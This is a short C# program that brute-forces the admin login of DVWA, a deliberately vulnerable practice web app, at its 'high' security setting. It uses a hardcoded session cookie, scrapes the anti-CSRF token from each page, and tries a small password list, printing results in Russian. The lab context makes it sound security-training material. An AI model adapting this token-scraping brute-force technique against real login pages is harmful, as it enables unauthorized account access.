using System.Net;
using System.Text.RegularExpressions;

class DVWABruteForce
{    
    static string url = "http://dvwa/vulnerabilities/brute/index.php";
    static string username = "admin";
    static List<string> passwords = new List<string>
    {
        "12345678", "qwerty", "Pinkman", "root", "admin", "WalterWhite", "1234567", "password"
    };

    public static async Task Main(string[] args)
    {
        using (HttpClientHandler handler = new HttpClientHandler { UseCookies = true })
        using (HttpClient client = new HttpClient(handler))
        {            
            var uri = new Uri(url);
            handler.CookieContainer.Add(uri, new Cookie("PHPSESSID", "70v501t8fnf3um8jfbdo2bo9fs"));
            handler.CookieContainer.Add(uri, new Cookie("security", "high"));
            
            foreach (string password in passwords)
            {
                try
                {
                    string loginPage = await client.GetStringAsync(url);
                    string csrfToken = ExtractCsrfToken(loginPage);

                    if (csrfToken == null)
                    {
                        Console.WriteLine(loginPage);
                        return;
                    }

                    
                    string requestUrl = $"{url}?username={username}&password={password}&Login=Login&user_token={csrfToken}";
                    var response = await client.GetAsync(requestUrl);
                    string responseContent = await response.Content.ReadAsStringAsync();
                    if (!responseContent.Contains("Username and/or password incorrect."))
                    {
                        Console.WriteLine($"Успешный вход: Username = {username}, Password = {password}");
                        return;
                    }
                    else
                    {
                        Console.WriteLine($"Неверная комбинация: Username = {username}, Password = {password}");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Ошибка при обработке комбинации Username = {username}, Password = {password}: {ex.Message}");
                }
            }
            Console.WriteLine("Перебор завершён. Подходящих комбинаций не найдено.");
        }
    }

    private static string ExtractCsrfToken(string html)
    {
        var match = Regex.Match(html, @"<input type='hidden' name='user_token' value='([a-f0-9]{32})' />");
        return match.Success ? match.Groups[1].Value : null;
    }
}